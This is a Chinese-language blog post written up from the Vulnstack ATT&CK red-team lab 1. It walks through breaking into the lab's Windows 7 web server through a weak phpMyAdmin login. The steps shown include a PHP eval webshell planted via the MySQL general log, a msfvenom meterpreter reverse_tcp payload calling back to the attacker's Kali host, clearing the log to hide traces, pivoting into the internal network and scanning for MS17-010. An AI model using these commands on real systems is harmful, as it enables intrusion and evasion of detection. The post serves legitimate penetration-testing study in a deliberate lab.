<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="ğ´_ğ‘Œğ‘¢">





<title>ATT&amp;CKâ€”çº¢é˜Ÿè¯„ä¼°1 | ğ“_ğš¼ğ“¾Í´ğ’” ğ“‘â„“ğ–”ğ“°</title>



    <link rel="icon" href="/image/favicon.svg">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
<meta name="generator" content="Hexo 6.1.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">ğ”¸_ğ•ğ•ŒÍ´ğ•¤ ğ”¹ğ•€ğŸ’¿ğ”¾</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        æ–‡ç« 
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        åˆ†ç±»
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        æ ‡ç­¾
                    </a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">ğ”¸_ğ•ğ•ŒÍ´ğ•¤ ğ”¹ğ•€ğŸ’¿ğ”¾</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; èœå•</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        æ–‡ç« 
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        åˆ†ç±»
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        æ ‡ç­¾
                    </a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">â–¶ï¸ å±•å¼€ç›®å½•</a>
    </div>
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a onclick="go_top()">â–³ é¡¶éƒ¨</a>
        <a onclick="go_bottom()">â–½ åº•éƒ¨</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "â–¼ æ”¶èµ·ç›®å½•"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "â–¶ï¸ å±•å¼€ç›®å½•"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">ATT&amp;CKâ€”çº¢é˜Ÿè¯„ä¼°1</h1>
            
                <div class="post-meta">
                    
                        <!--ä½œè€…:-->
                        <i class="iconfont icon-user"></i>
                        <a itemprop="author" rel="author" href="/">ğ´_ğ‘Œğ‘¢ </a> &nbsp;
                    

                    
                        <span class="post-time">
                        <!--å‘å¸ƒæ—¶é—´:-->
                        <i class="iconfont icon-time"></i>
                        <a href="#">2022-05-09&nbsp;&nbsp;21:28:03</a> &nbsp;
                        </span>
                    
                    
                        <span class="post-category">
                        <!--åˆ†ç±»:-->
                        <i class="iconfont icon-category"></i>
                            
                                <a href="/categories/ATT-CK%E9%9D%B6%E5%9C%BA/">ATT&CKé¶åœº</a>&nbsp;
                            
                        </span>
                    
                    
                    <span id="/2022/05/09/22-0509-01/" class="leancloud-visitors view" data-flag-title="ATT&amp;CKâ€”çº¢é˜Ÿè¯„ä¼°1">
                        <text class="post-meta-item-text">
                            <!--é˜…è¯»æ•°:-->
                            <i class="iconfont icon-view"></i>
                        </text>
                        
                        <text class="leancloud-visitors-count">åŠ è½½ä¸­</text>
                      </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="é¶åœºç¯å¢ƒè¯¦è§£"><a href="#é¶åœºç¯å¢ƒè¯¦è§£" class="headerlink" title="é¶åœºç¯å¢ƒè¯¦è§£"></a>é¶åœºç¯å¢ƒè¯¦è§£</h1><blockquote>
<p>é¶åœºåœ°å€ï¼š<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>æ‰€æœ‰é¶æœºå¯†ç ï¼šhongrisec@2019</p>
</blockquote>
<img src="/2022/05/09/22-0509-01/image-20220509225450243.png" alt="image-20220509225450243" style="zoom:80%;">

<blockquote>
<p>é…ç½®é¶åœºipï¼š</p>
</blockquote>
<ol>
<li><p>æŠŠwin7ç½‘ç»œé€‚é…å™¨ç”±NATæ¨¡å¼æ”¹ä¸ºè‡ªå®šä¹‰ï¼ˆVMnet10ï¼‰ï¼ŒVMnet10å…·ä½“é…ç½®å¦‚ä¸‹ï¼šï¼ˆç”¨äºæ¨¡æ‹Ÿå†…ç½‘ipï¼‰</p>
<img src="/2022/05/09/22-0509-01/image-20220510174309282.png" alt="image-20220510174309282" style="zoom:80%;">
</li>
<li><p>ç„¶åç»™win7æ·»åŠ ä¸€å¼ æ–°çš„ç½‘å¡ï¼Œé…ç½®æˆNATæ¨¡å¼ï¼ˆæ¨¡æ‹Ÿå¤–ç½‘ipï¼‰</p>
</li>
<li><p>å°†win2003å’Œwin2008çš„ç½‘å¡éƒ½è®¾ç½®æˆVMnet10ï¼ˆæ¨¡æ‹Ÿå†…ç½‘ipï¼‰</p>
</li>
<li><p>åœ¨win7ä¸Šé¢å¼€å¯phpstudyï¼ˆphpstudyæ‰€åœ¨è·¯å¾„ï¼šC:\phpStudy\phpStudy.exeï¼‰</p>
</li>
<li><p>æ³¨æ„ï¼šåœ¨ç™»é™†åŸŸæ§win2008æ—¶ï¼Œè¦æ±‚æˆ‘ä»¬é‡æ–°æ”¹å¯†ç ï¼ˆè¿™é‡ŒæŠŠåŸæ¥çš„å¯†ç hongrisec@2019æ”¹æˆadmin!@#45ï¼‰</p>
</li>
<li><p>é…ç½®å®Œåï¼Œwin7å¯ä»¥è®¿é—®å¤–ç½‘ï¼ˆç™¾åº¦ï¼‰ï¼Œä½†æ˜¯win2003ã€win2008éƒ½æ— æ³•è®¿é—®å¤–ç½‘</p>
</li>
</ol>
<p>é¶æœºçš„å…·ä½“ipå¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th align="center">win7ï¼ˆæ¨¡æ‹ŸwebæœåŠ¡å™¨ï¼‰</th>
<th align="center">win2003ï¼ˆæ¨¡æ‹ŸåŸŸæˆå‘˜ï¼‰</th>
<th align="center">win2008ï¼ˆæ¨¡æ‹ŸåŸŸæ§ï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ç½‘å¡1ï¼ˆVMnet10ï¼‰ï¼š<br>192.168.52.143</td>
<td align="center">ç½‘å¡ï¼ˆVMnet10ï¼‰ï¼š<br>192.168.52.141</td>
<td align="center">ç½‘å¡ï¼ˆVMnet10ï¼‰ï¼š<br>192.168.52.138</td>
</tr>
<tr>
<td align="center">ç½‘å¡2ï¼ˆNATï¼‰ï¼š<br>192.168.13.162</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h1 id="æ‰“é¶è¿‡ç¨‹"><a href="#æ‰“é¶è¿‡ç¨‹" class="headerlink" title="æ‰“é¶è¿‡ç¨‹"></a>æ‰“é¶è¿‡ç¨‹</h1><blockquote>
<p>æ”»å‡»ä¸»æœºä¸»è¦ä½¿ç”¨kali linuxï¼Œè®¾ç½®ä¸ºNATæ¨¡å¼ï¼Œipï¼š192.168.13.160</p>
</blockquote>
<h2 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>nmapæ‰«æç›®æ ‡ç½‘æ®µï¼Œå¾—åˆ°webæœåŠ¡å™¨ï¼ˆwin7ï¼‰çš„ip</p>
<img src="/2022/05/09/22-0509-01/image-20220510181111315.png" alt="image-20220510181111315" style="zoom:80%;">

<p>æ‰«æ192.168.13.162å¼€æ”¾çš„ç«¯å£ï¼Œå¼€æ”¾äº†80&#x2F;httpã€3306&#x2F;mysql</p>
<img src="/2022/05/09/22-0509-01/image-20220510181805326.png" alt="image-20220510181805326" style="zoom:80%;">

<p>è®¿é—®80ç«¯å£ï¼Œæ”¶é›†ä¸€äº›å¯èƒ½ç”¨åˆ°çš„ç›¸å…³ä¿¡æ¯</p>
<img src="/2022/05/09/22-0509-01/image-20220510210610580.png" alt="image-20220510210610580" style="zoom:80%;">

<p>æœ€ä¸‹æ–¹å‘ç°è¾“å…¥æ¡†</p>
<img src="/2022/05/09/22-0509-01/image-20220510181850763.png" alt="image-20220510181850763" style="zoom:80%;">

<p>å°è¯•ç”¨æˆ·åè¾“å…¥rootå¯†ç è¾“å…¥rootï¼Œç«Ÿç„¶ç›´æ¥è¿æ¥æˆåŠŸäº†</p>
<img src="/2022/05/09/22-0509-01/image-20220510182018136.png" alt="image-20220510182018136" style="zoom:80%;">

<p>ç„¶åæ‰«æç›®å½•</p>
<img src="/2022/05/09/22-0509-01/image-20220510183726355.png" alt="image-20220510183726355" style="zoom:80%;">

<p>å°è¯•è®¿é—®phpmyadmin</p>
<img src="/2022/05/09/22-0509-01/image-20220510183838154.png" alt="image-20220510183838154" style="zoom:80%;">

<h3 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h3><p>ç”¨rootå’ŒrootæˆåŠŸç™»é™†phpmyadmin</p>
<img src="/2022/05/09/22-0509-01/image-20220510183920290.png" alt="image-20220510183920290" style="zoom:80%;">

<h3 id="select-into-outfileå†™shell"><a href="#select-into-outfileå†™shell" class="headerlink" title="select into outfileå†™shell"></a>select into outfileå†™shell</h3><p>è¿™é‡Œæˆ‘ä»¬å°è¯•ç”¨into outfileå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œé¦–å…ˆç”¨<code>show global variables like &#39;%secure%&#39;;show global variables like &#39;%secure%&#39;;</code>æŸ¥è¯¢èƒ½å¦è¿›è¡Œå†™shellï¼Œè¿™é‡Œ<code>secure_file_priv = null</code>æ˜¯æ— æ³•è¿›è¡Œå†™shellçš„ï¼Œåªæœ‰<code>secure_file_priv</code>çš„å€¼ä¸ºç©ºæ—¶æ‰å¯ä»¥è¿›è¡Œshell </p>
<img src="/2022/05/09/22-0509-01/image-20220510204312389.png" alt="image-20220510204312389" style="zoom:80%;">

<h3 id="åˆ©ç”¨å…¨å±€æ—¥å¿—å†™shell"><a href="#åˆ©ç”¨å…¨å±€æ—¥å¿—å†™shell" class="headerlink" title="åˆ©ç”¨å…¨å±€æ—¥å¿—å†™shell"></a>åˆ©ç”¨å…¨å±€æ—¥å¿—å†™shell</h3><p>è™½ç„¶ä¸Šé¢æ— æ³•åˆ©ç”¨select into outfileå†™shellï¼Œä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œå°è¯•åˆ©ç”¨å…¨å±€æ—¥å¿—å†™shell</p>
<p>æŸ¥çœ‹æ˜¯å¦å¼€å¯mysqlçš„æ—¥å¿—åŠŸèƒ½ï¼Œ <code>show variables like &#39;%general%&#39;;</code></p>
<p>è¿™é‡Œ<code>general_log = OFF</code>ï¼Œæ²¡æœ‰å¼€å¯mysqlçš„æ—¥å¿—åŠŸèƒ½ï¼Œæ—¥å¿—ä¿å­˜çš„è·¯å¾„ä¸º<code>C:\phpStudy\MySQL\data\stu1.log</code></p>
<img src="/2022/05/09/22-0509-01/image-20220510204825605.png" alt="image-20220510204825605" style="zoom:80%;">

<p>æ‰§è¡Œ<code>set global general_log = on;</code>å°†<code>general_log = OFF</code>æ”¹ä¸º<code>general_log = on</code>ï¼Œå¼€å¯æ—¥å¿—åŠŸèƒ½ï¼Œå¼€å¯ä¹‹åï¼Œæ‰€æœ‰æ‰§è¡Œçš„sqlè¯­å¥éƒ½ä¼šè¢«è®°å½•åœ¨æ—¥å¿—ä¸­</p>
<p>ç„¶åæŠŠåŸæœ¬ä¿å­˜æ—¥å¿—çš„è·¯å¾„è¿›è¡Œä¿®æ”¹ï¼Œ<code>set global general_log_file=&#39;C:\\phpStudy\\WWW\\shell.php&#39;;</code>ï¼Œä¿®æ”¹ä¸º<code>C:\phpStudy\WWW\shell.php</code>ï¼Œè¿™æ ·å°±å¯ä»¥è§£æphpä¸€å¥è¯</p>
<p>ç„¶åå†æ¬¡æ‰§è¡Œ<code>show variables like &#39;%general%&#39;;</code> å³å¯å‘ç°æ—¥å¿—å·²ç»å¼€å¯ï¼Œå¹¶ä¸”ä¿å­˜æ–‡ä»¶ä¸ºshell.php</p>
<img src="/2022/05/09/22-0509-01/image-20220510210902243.png" alt="image-20220510210902243" style="zoom:80%;">

<p>æ‰§è¡Œsqlè¯­å¥ï¼Œå‘æ—¥å¿—ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬<code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</code></p>
<img src="/2022/05/09/22-0509-01/image-20220510205945770.png" alt="image-20220510205945770" style="zoom:80%;">

<p>ç„¶åå°è¯•ç”¨èšå‰‘è¿æ¥</p>
<img src="/2022/05/09/22-0509-01/image-20220510211122755.png" alt="image-20220510211122755" style="zoom:80%;">

<p>è¿æ¥æˆåŠŸåï¼Œè™šæ‹Ÿç»ˆç«¯æ‰§è¡Œ<code>whoami</code>å‘ç°æƒé™è¿˜æ˜¯<code>god\administrator</code>ï¼Œä¸æ˜¯<code>www-data</code>æƒé™</p>
<img src="/2022/05/09/22-0509-01/image-20220510211306909.png" alt="image-20220510211306909" style="zoom:80%;">

<p>æ³¨æ„ï¼šæœ€åè¿˜è¦è¿›è¡Œæ—¥å¿—çš„ç—•è¿¹æ¸…ç†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\MySQL\\data\\stu1.log&#x27;;  // æ¢å¤åŸlogæ–‡ä»¶è·¯å¾„    </span><br><span class="line">set global general_log = off;   // å…³é—­å…¨å±€æ—¥å¿—</span><br></pre></td></tr></table></figure>

<h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>å†…ç½‘æ¸—é€æˆ‘ä»¬å¯ä»¥é…åˆmsfæˆ–csè¿›è¡Œæ¸—é€ï¼Œç”±äºç›®å‰msfæ¥è§¦çš„æ›´å¤šï¼Œè¿™é‡Œä½¿ç”¨msf</p>
<p>åˆ©ç”¨msfç”Ÿæˆexeæœ¨é©¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.13.160 -f exe -o msfhack.exe</span><br></pre></td></tr></table></figure>

<p>ç›‘å¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set lhost 192.168.13.160</span><br><span class="line">set lport 6666 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>å°†msfhack.exeé€šè¿‡èšå‰‘ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä¸­</p>
<img src="/2022/05/09/22-0509-01/image-20220510214951214.png" alt="image-20220510214951214" style="zoom:80%;">

<p>åœ¨è™šæ‹Ÿç»ˆç«¯ä¸­é€šè¿‡<code>start msfhack.exe</code>æ‰§è¡Œ</p>
<img src="/2022/05/09/22-0509-01/image-20220510215114078.png" alt="image-20220510215114078" style="zoom:80%;">

<p>æˆåŠŸç›‘å¬åˆ°</p>
<img src="/2022/05/09/22-0509-01/image-20220511223210598.png" alt="image-20220511223210598" style="zoom:80%;">

<p>æ‰§è¡Œ<code>sysinfo</code>æŸ¥çœ‹ç›®æ ‡æœºå™¨çš„ä¿¡æ¯</p>
<img src="/2022/05/09/22-0509-01/image-20220510233644349.png" alt="image-20220510233644349" style="zoom:80%;">

<p>æ‰§è¡Œgetuidå¾—åˆ°å½“å‰æƒé™</p>
<img src="/2022/05/09/22-0509-01/image-20220510233725601.png" alt="image-20220510233725601" style="zoom:80%;">

<p>åˆ¤æ–­å½“å‰ç›®æ ‡æœºå™¨æ˜¯ä¸æ˜¯è™šæ‹Ÿæœºç¯å¢ƒä¸‹çš„ï¼ˆåˆ¤æ–­æ˜¯å¦ä¸ºèœœç½ï¼‰ï¼ŒåºŸè¯ï¼Œè¿™é‡Œè‚¯å®šæ˜¯å¤„äºè™šæ‹Ÿæœºä¸­çš„</p>
<img src="/2022/05/09/22-0509-01/image-20220510234911673.png" alt="image-20220510234911673" style="zoom:80%;">

<h3 id="ææƒè‡³systemæƒé™"><a href="#ææƒè‡³systemæƒé™" class="headerlink" title="ææƒè‡³systemæƒé™"></a>ææƒè‡³systemæƒé™</h3><p>å‘ç°æ˜¯administratoræƒé™ï¼Œå°è¯•è¿›ä¸€æ­¥æå‡è‡³systemæƒé™</p>
<p>è¿™é‡Œåˆ©ç”¨msfå¯ä»¥ç›´æ¥ç”¨<code>getsystem</code>ææƒæˆ–<code>è¿›ç¨‹è¿ç§»</code>æ¥ææƒï¼Œä¸¤ä¸ªåœ¨è¿™é‡Œéƒ½èƒ½æˆåŠŸï¼Œè¿™é‡Œç”¨<code>è¿›ç¨‹è¿ç§»</code>ææƒ</p>
<img src="/2022/05/09/22-0509-01/image-20220510233937298.png" alt="image-20220510233937298" style="zoom:80%;">

<p>

<img src="/2022/05/09/22-0509-01/image-20220510234105362.png" alt="image-20220510234105362" style="zoom:80%;">

</p><p>ææƒæˆåŠŸåè¿›è¡Œä¿¡æ¯æ”¶é›†</p>
<h3 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>åŸŸå†…ä¿¡æ¯æ”¶é›†</h4><p>æ‰§è¡Œ<code>shell</code>è¿›å…¥ç›®æ ‡å‘½ä»¤è¡Œï¼ˆcmdï¼‰ä¸‹ï¼ˆè§£å†³ä¹±ç <code>chcp 65001</code>ï¼‰</p>
<p>æŸ¥çœ‹ç›®æ ‡æ˜¯å¦åœ¨å¤šä¸ªåŸŸä¸­<code>net view /domain</code>ï¼Œå¾—åˆ°ç›®æ ‡åªåœ¨GODåŸŸä¸­</p>
<img src="/2022/05/09/22-0509-01/image-20220510221427064.png" alt="image-20220510221427064" style="zoom:80%;">

<p>æŸ¥çœ‹åŸŸå†…å…¶ä»–ç”¨æˆ·çš„ä¸»æœºå<code>net view</code>ï¼Œå¾—åˆ°OWAå’ŒROOT-TVI860UBEHä¸¤å°ä¸»æœº</p>
<img src="/2022/05/09/22-0509-01/image-20220510221532659.png" alt="image-20220510221532659" style="zoom:80%;">

<p>æ‰§è¡Œ<code>ipconfig /all</code> å¾—åˆ°dnsçš„åœ°å€192.168.52.138ï¼Œä¸€èˆ¬æ¥è¯´è¯¥ipå°±æ˜¯åŸŸæ§ip</p>
<img src="/2022/05/09/22-0509-01/image-20220510221833543.png" alt="image-20220510221833543" style="zoom:80%;">

<p>æ³¨æ„ï¼šæ­£å¸¸æ¥è¯´æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡nslookupæŸ¥çœ‹åˆ¤æ–­åŸŸæ§æ˜¯é‚£å°æœºå™¨ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰åšdnsè§£æï¼Œæ‰€ä»¥çœ‹ä¸å‡ºæ¥</p>
<h4 id="msfæ·»åŠ é™æ€è·¯ç”±"><a href="#msfæ·»åŠ é™æ€è·¯ç”±" class="headerlink" title="msfæ·»åŠ é™æ€è·¯ç”±"></a>msfæ·»åŠ é™æ€è·¯ç”±</h4><p>æŸ¥çœ‹ç›®æ ‡æœºå™¨æ‰€åœ¨å†…ç½‘ç½‘ç«¯ä¿¡æ¯ä¸å…¬ç½‘ç½‘ç«¯ä¿¡æ¯<code>run get_local_subnets</code></p>
<img src="/2022/05/09/22-0509-01/image-20220511111156462.png" alt="image-20220511111156462" style="zoom:80%;">

<p>æ·»åŠ é™æ€è·¯ç”±<code>run autoroute -s 192.168.52.0/24</code></p>
<img src="/2022/05/09/22-0509-01/image-20220511111212213.png" alt="image-20220511111212213" style="zoom:80%;">

<p>æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</p>
<img src="/2022/05/09/22-0509-01/image-20220511111235145.png" alt="image-20220511111235145" style="zoom:80%;">

<p>ç„¶åæŠŠmeterpreterä¼šè¯æ”¾åˆ°åå°ä¸­</p>
<img src="/2022/05/09/22-0509-01/image-20220511111709498.png" alt="image-20220511111709498" style="zoom:80%;">

<p>æŸ¥çœ‹å·²ç»æ·»åŠ çš„é™æ€è·¯ç”±</p>
<img src="/2022/05/09/22-0509-01/image-20220512132143209.png" alt="image-20220512132143209" style="zoom:80%;">

<p>è¿™æ ·æ·»åŠ å®Œæˆä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨msfä¸­è®¿é—®åˆ°å†…ç½‘ç½‘æ®µä¸­192.168.52.0&#x2F;24çš„æœºå™¨äº†ï¼Œä½†æ˜¯æˆ‘ä»¬çš„kaliæœºå™¨å…¶ä»–è½¯ä»¶è¿˜æ˜¯æ— æ³•è®¿é—®åˆ°192.168.52.0&#x2F;24ç½‘æ®µçš„æœºå™¨ï¼Œæ‰€ä»¥ä¸‹é¢æˆ‘ä»¬é…ç½®socksä»£ç†</p>
<h4 id="é…ç½®socksä»£ç†"><a href="#é…ç½®socksä»£ç†" class="headerlink" title="é…ç½®socksä»£ç†"></a>é…ç½®socksä»£ç†</h4><p>æ·»åŠ socksä»£ç†ï¼Œé€‰æ‹©å¯¹åº”æ¨¡å—</p>
<img src="/2022/05/09/22-0509-01/image-20220512135443058.png" alt="image-20220512135443058" style="zoom:80%;">

<p>é…ç½®æ¨¡å—ç›¸å…³å‚æ•°</p>
<img src="/2022/05/09/22-0509-01/image-20220512135611501.png" alt="image-20220512135611501" style="zoom:80%;">

<p>kaliä¸Šé…ç½®proxychains</p>
<p><code>vim /etc/proxychains.conf</code></p>
<img src="/2022/05/09/22-0509-01/image-20220512135128743.png" alt="image-20220512135128743" style="zoom:80%;">

<p>

<img src="/2022/05/09/22-0509-01/image-20220512135021796.png" alt="image-20220512135021796" style="zoom:80%;">

</p><p>ç„¶åä»£ç†msfï¼Œæˆ‘ä»¬åç»­å°±å¯ä»¥åœ¨msfä¸­ç›´æ¥è®¿é—®åˆ°å†…ç½‘ç½‘æ®µ</p>
<p><code>proxychains msfconsole</code></p>
<h4 id="proxychainsä»£ç†nmapæ‰«æå†…ç½‘"><a href="#proxychainsä»£ç†nmapæ‰«æå†…ç½‘" class="headerlink" title="proxychainsä»£ç†nmapæ‰«æå†…ç½‘"></a>proxychainsä»£ç†nmapæ‰«æå†…ç½‘</h4><p>å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ä»£ç†nmapæ‰«æå†…ç½‘ç½‘æ®µ</p>
<p>ç»“æœnmapæ‰«æå…¨æ˜¯é—®é¢˜ï¼ˆè¿™é‡Œä»£ç†ä¸çŸ¥é“å“ªé‡Œå‡ºé—®é¢˜äº†ã€‚ã€‚ã€‚ï¼‰</p>
<img src="/2022/05/09/22-0509-01/image-20220512142554943.png" alt="image-20220512142554943" style="zoom:80%;">

<p>åé¢ç”¨proxychainsçš„å‡çº§ç‰ˆproxychains4ï¼ˆä¹Ÿå°±æ˜¯proxychains-ngï¼‰ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œå‡ºç°è¶…æ—¶ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<img src="/2022/05/09/22-0509-01/image-20220512143922123.png" alt="image-20220512143922123" style="zoom:80%;">

<h4 id="åŸºäºudpåè®®æ‰«æå†…ç½‘ä¸»æœº"><a href="#åŸºäºudpåè®®æ‰«æå†…ç½‘ä¸»æœº" class="headerlink" title="åŸºäºudpåè®®æ‰«æå†…ç½‘ä¸»æœº"></a>åŸºäºudpåè®®æ‰«æå†…ç½‘ä¸»æœº</h4><p>åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº  <code>use auxiliary/scanner/discovery/udp_probe</code> </p>
<img src="/2022/05/09/22-0509-01/image-20220511111749761.png" alt="image-20220511111749761" style="zoom:80%;">

<p>æ‰«æåå‘ç°ä¸‰å°å†…ç½‘ä¸»æœºï¼Œå…¶ä¸­192168.52.143æ˜¯å·²çŸ¥çš„å†…ç½‘ä¸»æœºï¼Œå¾—åˆ°äº†å¦å¤–çš„ä¸¤å°å†…ç½‘ä¸»æœº<code>192.168.52.138</code>ã€<code>192.168.52.141</code></p>
<img src="/2022/05/09/22-0509-01/image-20220511112023387.png" alt="image-20220511112023387" style="zoom:80%;">

<h4 id="æ‰«æå†…ç½‘ä¸»æœºSMBæœåŠ¡"><a href="#æ‰«æå†…ç½‘ä¸»æœºSMBæœåŠ¡" class="headerlink" title="æ‰«æå†…ç½‘ä¸»æœºSMBæœåŠ¡"></a>æ‰«æå†…ç½‘ä¸»æœºSMBæœåŠ¡</h4><p>ä½¿ç”¨<code>use auxiliary/scanner/smb/smb_version</code>æ¨¡å—æ‰«æsmbæœåŠ¡</p>
<img src="/2022/05/09/22-0509-01/image-20220511114056143.png" alt="image-20220511114056143" style="zoom:80%;">

<p>æ‰«æåï¼Œå‘ç°ä¸¤å°ä¸»æœºéƒ½æœ‰å¼€æ”¾smbæœåŠ¡ï¼Œä¸€å°ä¸»æœºæ˜¯2003ï¼Œå¦ä¸€å°æ˜¯2008</p>
<img src="/2022/05/09/22-0509-01/image-20220511114405528.png" alt="image-20220511114405528" style="zoom:80%;">

<h4 id="æ‰«ææ°¸æ’ä¹‹è“"><a href="#æ‰«ææ°¸æ’ä¹‹è“" class="headerlink" title="æ‰«ææ°¸æ’ä¹‹è“"></a>æ‰«ææ°¸æ’ä¹‹è“</h4><p>ä½¿ç”¨<code>use auxiliary/scanner/smb/smb_ms17_010</code>æ‰«æå†…ç½‘ä¸»æœºæ˜¯å¦å­˜åœ¨æ°¸æ’ä¹‹è“ï¼Œå‘ç°ä¸¤å°ä¸»æœºéƒ½å¯èƒ½å­˜åœ¨æ°¸æ’ä¹‹è“</p>
<img src="/2022/05/09/22-0509-01/image-20220511114629797.png" alt="image-20220511114629797" style="zoom:80%;">

